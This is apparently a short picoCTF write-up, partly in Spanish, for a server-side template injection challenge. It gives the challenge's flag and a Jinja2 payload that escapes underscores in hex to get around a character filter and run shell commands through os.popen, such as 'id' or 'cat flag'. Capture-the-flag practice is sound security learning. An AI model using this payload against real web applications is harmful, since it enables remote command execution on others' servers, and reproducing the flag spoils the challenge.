## Descripción

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:58114/)!
## Solución

# picoCTF{sst1_f1lt3r_byp4ss_a9824e27}
## Notas Adicionales

lo mismo que en SSTI1, pero usando este codigo: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} , cambias id por cat flag
## Referencias
https://onsecurity.io/article/server-side-template-injection-with-jinja2

